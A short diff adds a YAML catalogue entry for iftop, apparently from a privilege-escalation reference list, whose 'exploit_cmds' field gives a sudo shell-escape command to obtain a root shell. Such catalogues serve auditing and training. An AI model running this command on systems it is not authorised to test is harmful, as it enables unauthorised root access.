@@ -1,0 +1,4 @@
+name: iftop
+binary_path: /usr/bin/iftop
+exploit_cmds:
+- sudo /usr/bin/iftop && !/bin/sh
